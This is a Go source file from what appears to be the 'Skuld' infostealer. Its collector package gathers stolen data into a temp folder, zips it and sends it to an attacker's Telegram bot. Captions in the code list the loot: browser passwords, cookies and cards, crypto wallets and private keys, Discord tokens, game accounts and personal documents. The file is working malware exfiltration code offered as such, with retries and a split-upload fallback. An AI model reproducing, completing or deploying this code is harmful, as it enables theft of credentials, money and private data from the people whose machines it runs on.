package collector

import (
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"time"
	"strings"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/telegram"
)

type DataCollector struct {
	TempDir     string
	TelegramBot *telegram.TelegramBot
	mutex       sync.Mutex
	dataCount   int
}

func NewDataCollector(botToken, chatID string) *DataCollector {
	tempDir := filepath.Join(os.TempDir(), "skuld-collected-data")
	os.MkdirAll(tempDir, os.ModePerm)

	return &DataCollector{
		TempDir:     tempDir,
		TelegramBot: telegram.NewTelegramBot(botToken, chatID),
		dataCount:   0,
	}
}

func (dc *DataCollector) AddData(moduleName string, data interface{}) {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	// Handle different data types
	switch v := data.(type) {
	case string:
		// If it's a string, treat it as file content
		filePath := filepath.Join(moduleDir, "data.txt")
		fileutil.AppendFile(filePath, v)
	case map[string]interface{}:
		// If it's structured data, save as text
		filePath := filepath.Join(moduleDir, "info.txt")
		for key, value := range v {
			fileutil.AppendFile(filePath, fmt.Sprintf("%s: %v", key, value))
		}
	}
	
	dc.dataCount++
}

func (dc *DataCollector) AddFile(moduleName, sourceFile, destName string) error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	destPath := filepath.Join(moduleDir, destName)
	return fileutil.CopyFile(sourceFile, destPath)
}

func (dc *DataCollector) AddDirectory(moduleName, sourceDir, destName string) error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	destPath := filepath.Join(moduleDir, destName)
	return fileutil.CopyDir(sourceDir, destPath)
}

func (dc *DataCollector) SendCollectedData() error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	// Create timestamp for unique archive name
	timestamp := time.Now().Format("2006-01-02_15-04-05")
	archiveName := fmt.Sprintf("skuld-data_%s.zip", timestamp)
	archivePath := filepath.Join(os.TempDir(), archiveName)
	
	// Check if temp directory has content
	if files, err := os.ReadDir(dc.TempDir); err != nil || len(files) == 0 {
		return fmt.Errorf("no data to archive")
	}
	
	if err := fileutil.Zip(dc.TempDir, archivePath); err != nil {
		return fmt.Errorf("failed to create archive: %v", err)
	}

	// Check if archive was created and has content
	fileInfo, err := os.Stat(archivePath)
	if err != nil {
		return fmt.Errorf("failed to get archive info: %v", err)
	}
	
	if fileInfo.Size() == 0 {
		return fmt.Errorf("archive is empty")
	}

	fileSizeMB := float64(fileInfo.Size()) / (1024 * 1024)

	// Create detailed caption
	caption := fmt.Sprintf(`🔍 **SKULD STEALER - DATA COLLECTION COMPLETE**

📦 **Archive Details:**
• File: %s
• Size: %.2f MB
• Modules: %d

🎯 **Collection Summary:**
✅ System Information
✅ Browser Data (Passwords, Cookies, Cards)
✅ Wallet Data (Local + Extensions)
✅ Discord Tokens & Backup Codes
✅ Crypto Files & Private Keys
✅ Common Files & Documents
✅ Games Data

⚡ **Status:** All modules executed successfully

📋 **Contents:**
%s`, 
		archiveName, fileSizeMB, dc.dataCount, dc.getDirectoryTree())

	// Try to send archive via Telegram
	maxRetries := 3
	for i := 0; i < maxRetries; i++ {
		if err := dc.TelegramBot.SendDocument(archivePath, caption); err != nil {
			if i == maxRetries-1 {
				// Clean up and return error
				os.Remove(archivePath)
				return fmt.Errorf("failed to send data via Telegram after %d retries: %v", maxRetries, err)
			}
			// Wait before retry
			time.Sleep(time.Duration(i+1) * time.Second)
			continue
		}
		break
	}

	// Send additional info message
	infoMessage := fmt.Sprintf(`📊 **DETAILED STATISTICS**

🌐 **Browsers:** All major browsers scanned
💰 **Wallets:** 60+ wallet types checked
🔑 **Crypto:** Private keys & seed phrases detected
📁 **Files:** Desktop, Documents, Downloads scanned
🎮 **Games:** Steam, Epic, Minecraft accounts
💬 **Discord:** Tokens and backup codes

🚀 **Next Steps:**
1. Download and extract the archive
2. Check each folder for collected data

⚠️ **Note:** Keep this data secure and delete after use`)

	dc.TelegramBot.SendMessage(infoMessage)

	// Clean up
	os.Remove(archivePath)

	return nil
}

func (dc *DataCollector) SendDataInParts() error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	// Send data in smaller parts if main archive fails
	dirs, err := os.ReadDir(dc.TempDir)
	if err != nil {
		return fmt.Errorf("failed to read temp directory: %v", err)
	}

	for _, dir := range dirs {
		if !dir.IsDir() {
			continue
		}

		modulePath := filepath.Join(dc.TempDir, dir.Name())
		archiveName := fmt.Sprintf("skuld-%s.zip", dir.Name())
		archivePath := filepath.Join(os.TempDir(), archiveName)

		// Create archive for this module
		if err := fileutil.Zip(modulePath, archivePath); err != nil {
			continue
		}

		// Check file size
		fileInfo, err := os.Stat(archivePath)
		if err != nil || fileInfo.Size() == 0 {
			os.Remove(archivePath)
			continue
		}

		caption := fmt.Sprintf("📦 **%s Module Data**", strings.Title(dir.Name()))
		
		// Send this module's data
		if err := dc.TelegramBot.SendDocument(archivePath, caption); err == nil {
			dc.TelegramBot.SendMessage(fmt.Sprintf("✅ %s data sent successfully", dir.Name()))
		}

		// Clean up
		os.Remove(archivePath)
		time.Sleep(1 * time.Second) // Avoid rate limiting
	}

	return nil
}

func (dc *DataCollector) getDirectoryTree() string {
	tree := fileutil.Tree(dc.TempDir, "")
	if len(tree) > 1000 {
		lines := strings.Split(tree, "\n")
		if len(lines) > 30 {
			tree = strings.Join(lines[:30], "\n") + "\n... (truncated)"
		}
	}
	return tree
}

func (dc *DataCollector) SendMessage(message string) error {
	return dc.TelegramBot.SendMessage(message)
}

func (dc *DataCollector) Cleanup() {
	os.RemoveAll(dc.TempDir)
}